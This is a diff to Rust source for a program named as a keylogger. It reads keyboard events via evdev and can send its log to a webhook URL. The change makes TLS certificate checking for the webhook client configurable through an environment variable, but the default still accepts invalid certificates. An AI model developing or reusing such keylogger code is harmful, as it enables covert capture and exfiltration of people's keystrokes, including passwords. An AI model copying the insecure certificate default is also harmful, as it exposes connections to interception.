@@ -2,6 +2,7 @@ use evdev::{Device, EventType, InputEventKind, Key};
 use std::fs::OpenOptions;
 use std::io::Write;
 use std::os::unix::io::AsRawFd;
+use std::env;
 use chrono::Local;
 use nix::fcntl::{FcntlArg, OFlag};
 use nix::sys::epoll::{self, EpollEvent, EpollFlags, EpollOp};
@@ -131,12 +132,24 @@ pub fn run_keylogger(log_path: &str, webhook_url: Option<String>) {
             
             log_to_file(&format!("Initializing webhook client for URL: {}", url));
             
+            // Check if user wants to accept invalid certificates (for testing services)
+            // Set RUST_KEY_ACCEPT_INVALID_CERTS=false to enforce strict certificate validation
+            let accept_invalid_certs = env::var("RUST_KEY_ACCEPT_INVALID_CERTS")
+                .unwrap_or_else(|_| "true".to_string())
+                .to_lowercase() != "false";
+            
+            if accept_invalid_certs {
+                log_to_file("⚠️  WARNING: Certificate validation is disabled for compatibility with testing services");
+                log_to_file("⚠️  This makes the connection vulnerable to man-in-the-middle attacks");
+                log_to_file("⚠️  Set RUST_KEY_ACCEPT_INVALID_CERTS=false for strict validation");
+            } else {
+                log_to_file("Certificate validation is enabled (strict mode)");
+            }
+            
             // Create HTTP client once
-            // Use danger_accept_invalid_certs for compatibility with various webhook endpoints
-            // and to handle certificate validation issues that commonly occur with testing services
             let client = match reqwest::blocking::Client::builder()
                 .timeout(std::time::Duration::from_secs(10))  // Increased from 5s to 10s
-                .danger_accept_invalid_certs(true)  // Accept self-signed/invalid certificates
+                .danger_accept_invalid_certs(accept_invalid_certs)
                 .build() {
                 Ok(c) => {
                     log_to_file("HTTP client created successfully");
